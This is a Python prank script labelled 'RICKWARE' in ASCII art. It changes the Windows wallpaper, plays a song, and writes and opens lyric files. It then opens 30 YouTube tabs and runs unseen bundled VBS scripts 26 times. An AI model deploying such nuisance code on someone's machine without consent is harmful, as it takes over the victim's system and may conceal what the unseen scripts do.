import webbrowser
import os
import ctypes
import random

os.system("@echo off")
os.system("cls")

SCRIPTS = ['script_one.vbs' , 'script_two.vbs']

main_text = """

██████╗░██╗░█████╗░██╗░░██╗░██╗░░░░░░░██╗░█████╗░██████╗░███████╗██████████████
██╔══██╗██║██╔══██╗██║░██╔╝░██║░░██╗░░██║██╔══██╗██╔══██╗██╔════╝
██████╔╝██║██║░░╚═╝█████═╝░░╚██╗████╗██╔╝███████║██████╔╝█████╗░░██████████
██╔══██╗██║██║░░██╗██╔═██╗░░░████╔═████║░██╔══██║██╔══██╗██╔══╝░░
██║░░██║██║╚█████╔╝██║░╚██╗░░╚██╔╝░╚██╔╝░██║░░██║██║░░██║███████╗██████ ████████
╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝
"""

print(main_text)

ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath("assets\\background.png") , 0)

ly = ["we're no strangers to love" , "you know the rules and so do i" , "a full commitment's what i'm thinking of" , "you won't get this from any other guy" , "i just wanna tell you how i m feeling" , "gotta make you understand" , "never gonna give you up" , "never gonna let you down" , "never gonna run around and desert you" , "never gonna make you cry" , "never gonna say good bye" , "never gonna tell a lie and hurt you"]

os.system("assets\\song.mp3")

for i in range(12):
    with open("nggyu_{}.txt".format(i) , "w") as f:
        f.write(ly[i])
   
    os.system(f"nggyu_{i}.txt")

for x in range(15):
    webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")

for x in range(15):
    webbrowser.open("https://www.youtube.com/watch?v=UcRtFYAz2Yo&ab_channel=10HoursMovies")

for s in range(26):
    os.system(f'scripts\\{random.choice(SCRIPTS)}')
